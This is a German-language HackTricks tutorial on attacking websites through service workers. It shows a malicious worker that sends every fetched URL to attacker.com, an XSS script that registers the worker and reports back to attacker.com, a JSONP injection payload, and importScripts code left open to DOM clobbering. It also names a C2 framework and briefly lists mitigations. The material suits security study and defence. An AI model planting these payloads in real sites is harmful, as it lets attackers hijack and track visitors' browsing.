# Ausnutzen von Service-Workern



<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? M√∂chten Sie Ihr **Unternehmen in HackTricks beworben sehen**? Oder m√∂chten Sie Zugriff auf die **neueste Version des PEASS erhalten oder HackTricks im PDF-Format herunterladen**? √úberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**üí¨**](https://emojipedia.org/speech-balloon/) **Discord-Gruppe** bei (https://discord.gg/hRep4RUj7f) oder der **Telegram-Gruppe** oder **folgen** Sie mir auf **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**hacktricks-Repository**](https://github.com/carlospolop/hacktricks) **und das** [**hacktricks-cloud-Repository**](https://github.com/carlospolop/hacktricks-cloud) **einreichen**.

</details>

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Grundlegende Informationen

Ein **Service Worker** ist ein Skript, das von Ihrem Browser im Hintergrund ausgef√ºhrt wird, unabh√§ngig von einer Webseite, und Funktionen erm√∂glicht, die keine Webseite oder Benutzerinteraktion erfordern und somit die F√§higkeiten zur **Offline- und Hintergrundverarbeitung** verbessern. Detaillierte Informationen zu Service Workern finden Sie [hier](https://developers.google.com/web/fundamentals/primers/service-workers). Durch Ausnutzen von Service Workern innerhalb einer anf√§lligen Webdom√§ne k√∂nnen Angreifer die Kontrolle √ºber die Interaktionen des Opfers mit allen Seiten innerhalb dieser Dom√§ne erlangen.


### √úberpr√ºfen von vorhandenen Service Workern

Vorhandene Service Worker k√∂nnen im Abschnitt **Service Worker** des **Anwendungs**-Tabs in den **Entwicklertools** √ºberpr√ºft werden. Eine weitere Methode besteht darin, [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals) zu besuchen, um eine detailliertere Ansicht zu erhalten.

### Push-Benachrichtigungen

**Push-Benachrichtigungsberechtigungen** beeinflussen direkt die F√§higkeit eines **Service Workers**, mit dem Server zu kommunizieren, ohne direkte Benutzerinteraktion. Wenn Berechtigungen verweigert werden, wird das Potenzial des Service Workers zur kontinuierlichen Bedrohung eingeschr√§nkt. Im Gegensatz dazu erh√∂ht das Gew√§hren von Berechtigungen die Sicherheitsrisiken, indem der Empfang und die Ausf√ºhrung potenzieller Exploits erm√∂glicht werden.

## Angriff durch Erstellen eines Service Workers

Um diese Schwachstelle auszunutzen, m√ºssen Sie Folgendes finden:

* Einen Weg, um **beliebige JS-Dateien auf den Server hochzuladen und ein XSS zum Laden des Service Workers** der hochgeladenen JS-Datei zu finden
* Eine **anf√§llige JSONP-Anfrage**, bei der Sie **die Ausgabe manipulieren k√∂nnen (mit beliebigem JS-Code)** und ein **XSS**, um **den JSONP mit einem Payload zu laden**, der einen b√∂sartigen Service Worker l√§dt.

Im folgenden Beispiel werde ich einen Code pr√§sentieren, um einen **neuen Service Worker zu registrieren**, der auf das `fetch`-Ereignis h√∂rt und **jede abgerufene URL an den Server der Angreifer sendet** (dies ist der Code, den Sie zum **Hochladen** auf den **Server** oder zum Laden √ºber eine **anf√§llige JSONP**-Antwort ben√∂tigen):
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
Und dies ist der Code, der den Worker registriert (den Code, den Sie ausf√ºhren k√∂nnen, indem Sie XSS missbrauchen). In diesem Fall wird eine GET-Anfrage an den Server der Angreifer gesendet, um zu benachrichtigen, ob die Registrierung des Service Workers erfolgreich war oder nicht:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
Im Falle der Ausnutzung eines anf√§lligen JSONP-Endpunkts sollten Sie den Wert in `var sw` platzieren. Zum Beispiel:
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
Es gibt ein **C2**, das der **Ausnutzung von Service Workern** gewidmet ist, namens [**Shadow Workers**](https://shadow-workers.github.io), das sehr n√ºtzlich sein wird, um diese Schwachstellen auszunutzen.

Die **24-Stunden-Cache-Anweisung** begrenzt die Lebensdauer eines b√∂sartigen oder kompromittierten **Service Workers (SW)** auf h√∂chstens 24 Stunden nach Behebung einer XSS-Schwachstelle, vorausgesetzt, der Client ist online. Um die Schwachstelle zu minimieren, k√∂nnen Seitenbetreiber die Time-To-Live (TTL) des SW-Skripts senken. Entwicklern wird auch empfohlen, einen [**Service Worker Kill-Switch**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776) f√ºr eine schnelle Deaktivierung zu erstellen.

## Ausnutzung von `importScripts` in einem SW √ºber DOM Clobbering

Die Funktion **`importScripts`**, die von einem Service Worker aufgerufen wird, kann ein Skript von einer anderen Domain **importieren**. Wenn diese Funktion mit einem **Parameter aufgerufen wird, den ein Angreifer** √§ndern k√∂nnte, k√∂nnte er ein JS-Skript von seiner Domain **importieren** und XSS erhalten.

**Dies umgeht sogar CSP-Schutzma√ünahmen.**

**Beispiel f√ºr anf√§lligen Code:**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### Mit DOM Clobbering

F√ºr weitere Informationen dar√ºber, was DOM Clobbering ist, siehe:

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

Wenn die URL/Dom√§ne, die der SW verwendet, um **`importScripts`** aufzurufen, **innerhalb eines HTML-Elements** liegt, ist es **m√∂glich, sie √ºber DOM Clobbering zu modifizieren**, um den SW **ein Skript von Ihrer eigenen Dom√§ne laden zu lassen**.

F√ºr ein Beispiel hierzu siehe den Referenzlink.

## Referenzen

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? M√∂chten Sie Ihr **Unternehmen in HackTricks beworben sehen**? Oder m√∂chten Sie Zugriff auf die **neueste Version des PEASS erhalten oder HackTricks im PDF-Format herunterladen**? √úberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* **Treten Sie der** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**hacktricks-Repo**](https://github.com/carlospolop/hacktricks) **und das** [**hacktricks-cloud-Repo**](https://github.com/carlospolop/hacktricks-cloud) **einreichen**.

</details>
